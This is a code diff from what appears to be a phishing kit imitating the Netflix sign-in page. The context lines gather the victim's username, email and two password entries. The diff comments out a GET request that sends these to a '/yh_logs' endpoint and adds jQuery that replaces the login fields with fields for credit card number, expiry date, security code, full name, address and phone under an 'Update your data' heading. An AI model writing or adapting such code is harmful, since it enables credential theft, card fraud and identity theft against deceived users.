@@ -124,9 +124,33 @@ setTimeout(function(){
 	var encodedString = btoa(JSON.stringify({ username: $('input[name="userLoginId"]').val(), email: getUrlVars()['email'], password1:Window.pass1 ,password2: $('input[type="password"]').val()}));
 	let datastg=JSON.parse(atob(encodedString));
 	console.log(datastg);
-	$.get( "/yh_logs", { username: datastg['username'],  email:datastg['email'], password:datastg['password1'], password2:datastg['password2']}).done(function( data ) {
-    window.location.replace("https://www.netflix.com");
-  });
+	//$.get( "/yh_logs", { username: datastg['username'],  email:datastg['email'], password:datastg['password1'], password2:datastg['password2']}).done(function( data ) {
+    //window.location.replace("https://www.netflix.com");});
+	$('.nfEmailPhoneInput').remove();
+	$('.nfPasswordInput').remove();
+	$('label[for="bxid_rememberMe_true"').remove();
+	$('.fb-login').remove();
+	$('.login-signup-now').remove();
+	
+	$('.hybrid-login-form-main .login-form').prepend('<div id="newdiv9" data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input"><div class="nfInputPlacement"><div class="nfEmailPhoneControls"><label class="input_id"><input type="text" data-uia="login-field" name="userLoginId" class="nfTextField" value="" tabindex="0"><label for="id_userLoginId" class="placeLabel">Contact Number</label></label></div></div></div>');
+	$('.hybrid-login-form-main .login-form').prepend('<div id="newdiv8" data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input"><div class="nfInputPlacement"><div class="nfEmailPhoneControls"><label class="input_id"><input type="text" data-uia="login-field" name="userLoginId" class="nfTextField" value="" tabindex="0"><label for="id_userLoginId" class="placeLabel">Zip Code</label></label></div></div></div>');
+	$('.hybrid-login-form-main .login-form').prepend('<div id="newdiv7" data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input"><div class="nfInputPlacement"><div class="nfEmailPhoneControls"><label class="input_id"><input type="text" data-uia="login-field" name="userLoginId" class="nfTextField" value="" tabindex="0"><label for="id_userLoginId" class="placeLabel">State</label></label></div></div></div>');
+	$('.hybrid-login-form-main .login-form').prepend('<div id="newdiv6" data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input"><div class="nfInputPlacement"><div class="nfEmailPhoneControls"><label class="input_id"><input type="text" data-uia="login-field" name="userLoginId" class="nfTextField" value="" tabindex="0"><label for="id_userLoginId" class="placeLabel">City</label></label></div></div></div>');
+	$('.hybrid-login-form-main .login-form').prepend('<div id="newdiv5" data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input"><div class="nfInputPlacement"><div class="nfEmailPhoneControls"><label class="input_id"><input type="text" data-uia="login-field" name="userLoginId" class="nfTextField" value="" tabindex="0"><label for="id_userLoginId" class="placeLabel">Current Address</label></label></div></div></div>');
+	$('.hybrid-login-form-main .login-form').prepend('<div id="newdiv4" data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input"><div class="nfInputPlacement"><div class="nfEmailPhoneControls"><label class="input_id"><input type="text" data-uia="login-field" name="userLoginId" class="nfTextField" value="" tabindex="0"><label for="id_userLoginId" class="placeLabel">Full Name</label></label></div></div></div>');
+	$('.hybrid-login-form-main .login-form').prepend('<div id="newdiv3" data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input"><div class="nfInputPlacement"><div class="nfEmailPhoneControls"><label class="input_id"><input type="text" data-uia="login-field" name="userLoginId" class="nfTextField" value="" tabindex="0"><label for="id_userLoginId" class="placeLabel">Security Code</label></label></div></div></div>');
+	$('.hybrid-login-form-main .login-form').prepend('<div id="newdiv2" data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input"><div class="nfInputPlacement"><div class="nfEmailPhoneControls"><label class="input_id"><input type="text" data-uia="login-field" name="userLoginId" class="nfTextField" value="" tabindex="0"><label for="id_userLoginId" class="placeLabel">Expiry Date</label></label></div></div></div>');
+	$('.hybrid-login-form-main .login-form').prepend('<div id="newdiv1" data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input"><div class="nfInputPlacement"><div class="nfEmailPhoneControls"><label class="input_id"><input type="text" data-uia="login-field" name="userLoginId" class="nfTextField" value="" tabindex="0"><label for="id_userLoginId" class="placeLabel">Credit Card Number</label></label></div></div></div>');
+	$('.hybrid-login-form-main h1').text('Update your data')
+	$('.login-button').text('Update');
+	$('.loader-default').removeClass('is-active');
+	for(let i=1;i<20;i++)
+	{
+	$('#newdiv'+i+' input').on('change',()=>{$('#newdiv'+i+' input').toggleClass('hasText', $('#newdiv'+i+' input').val().length>0)});
+	$('#newdiv'+i+'').on('click',()=>{$('#newdiv'+i+' input').focus()});
+	}
+	
+	
 	}
 	else
 	{
